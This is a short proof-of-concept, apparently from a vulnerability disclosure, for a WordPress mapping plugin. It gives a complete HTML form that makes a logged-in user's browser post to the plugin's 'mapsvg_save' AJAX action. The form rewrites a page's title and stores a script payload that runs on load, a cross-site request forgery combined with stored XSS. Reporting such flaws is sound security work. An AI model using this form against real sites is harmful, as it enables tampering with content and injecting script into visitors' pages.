* Ensure you have page with ID of 2.
* Whilst logged in, visit an html page with this content and submit the form:

```
<form method="POST" action="http://localhost/wp-admin/admin-ajax.php?action=mapsvg_save">
 <input type="text" name="data[title]" value="A bad value">
 <input type="text" name="data[mapsvg_data]" value="<script>alert('hello')</script>">
 <input type="text" name="data[map_id]" value="2">
 <input type="submit">
</form>

```

* Visit the page with ID of 2. It now has title of “A bad value” and alerts “hello” on loading.
